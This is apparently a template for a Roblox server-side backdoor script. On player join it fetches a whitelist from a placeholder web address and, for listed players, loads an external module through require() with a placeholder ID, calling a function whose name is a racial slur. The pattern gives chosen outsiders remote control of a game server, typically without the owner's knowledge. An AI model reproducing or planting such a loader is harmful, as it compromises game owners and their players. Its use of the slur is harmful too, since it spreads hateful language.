local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local DATABASE_URL = "urwhitelistweblink"

local function getWhitelist()
    local success, response = pcall(function()
        return HttpService:GetAsync(DATABASE_URL)
    end)

    if not success then return {} end

    local data = HttpService:JSONDecode(response)
    return data.whitelist or {}
end

Players.PlayerAdded:Connect(function(player)
    local whitelist = getWhitelist()

    if table.find(whitelist, player.Name) then
        require(urssui).nigga(player.Name)
    end
end)
